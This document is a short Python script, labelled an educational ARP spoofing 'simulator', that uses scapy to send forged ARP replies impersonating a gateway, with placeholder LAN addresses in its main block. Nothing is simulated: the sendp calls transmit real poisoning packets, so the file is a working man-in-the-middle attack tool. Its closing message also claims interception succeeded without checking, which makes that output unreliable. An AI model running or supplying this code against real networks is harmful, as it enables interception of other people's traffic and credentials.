# ARP Spoofing Attack Simulator (Educational Use Only)
from scapy.all import ARP, Ether, sendp
import time, colorama
from colorama import Fore, Style
colorama.init()

def arp_spoof(target_ip, spoof_ip, target_mac, attacker_mac, count=5):
    print(Fore.RED + f"[ATTACK] Starting ARP Spoofing: Impersonating {spoof_ip} to {target_ip}" + Style.RESET_ALL)
    packet = Ether(dst=target_mac) / ARP(
        op=2,               # ARP Reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac  # Attacker's MAC pretending to be gateway
    )
    for i in range(count):
        sendp(packet, verbose=False)
        print(Fore.YELLOW + f"  [Packet {i+1}] Sent fake ARP reply: {spoof_ip} is at {attacker_mac}" + Style.RESET_ALL)
        time.sleep(1)
    print(Fore.RED + "[ATTACK] ARP Cache Poisoned! Traffic is now being intercepted." + Style.RESET_ALL)

if __name__ == "__main__":
    # Simulated values for demo
    arp_spoof(
        target_ip="192.168.1.10",
        spoof_ip="192.168.1.1",     # Gateway IP we're impersonating
        target_mac="aa:bb:cc:dd:ee:ff",
        attacker_mac="11:22:33:44:55:66"
    )